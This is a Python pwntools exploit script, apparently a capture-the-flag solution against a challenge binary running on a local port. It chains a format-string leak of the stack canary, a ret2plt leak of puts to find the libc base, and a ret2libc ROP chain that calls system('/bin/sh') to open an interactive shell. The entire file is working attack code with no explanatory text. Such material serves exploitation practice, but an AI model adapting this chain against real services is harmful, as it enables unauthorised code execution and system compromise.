from pwn import *
import time

context.binary = "./resources/challenge"
elf = ELF("./resources/challenge")
libc = ELF("./resources/libc.so.6") # This is my libc,

nc = remote("0.0.0.0", 1337) # Obviously for testing purpose

# Leaking canary using format string exploit
nc.recvuntil(b"[easy/medium/hard] :")
nc.sendline(b"%167$p")
nc.recvline()
nc.recvline()
nc.recvline()
canary = nc.recvline().strip()

log.success("Leaked value of canary : {}".format(hex(int(canary, 16))))

canary = p32(int(canary, 16))


# Leaking GOT address of puts using ret2plt

rop = ROP(elf)
rop.raw(canary*6)
rop.puts(elf.got["puts"])
rop.call(elf.sym["main"])

nc.recvuntil(b">>")
nc.sendline(b"3")
nc.recvuntil(b"Voulez-vous vraiment quitter Breizh deminage ? [oui/non]")
nc.sendline(rop.chain())
leak = nc.recvline()
print(leak)

leakedPuts = u32(leak[1:5])
libc.address = leakedPuts - libc.sym["puts"]

log.success("Libc base address: {}".format(hex(libc.address)))
time.sleep(5) # Waiting so the program can terminate operations

# Using ret2libc to get a shell
rop = ROP(elf)
rop.raw(canary*6)
rop.call(libc.sym["system"])
rop.call(libc.sym["exit"])
rop.raw(p32(next(libc.search(b"/bin/sh"))))

nc.recvuntil(b"[easy/medium/hard] :")
nc.sendline(b"hard")
nc.recvline()
nc.recvline()
nc.recvline()
nc.recvuntil(b">>")
nc.sendline(b"3")
nc.recvuntil(b"Voulez-vous vraiment quitter Breizh deminage ? [oui/non]")
nc.sendline(rop.chain())
nc.interactive()
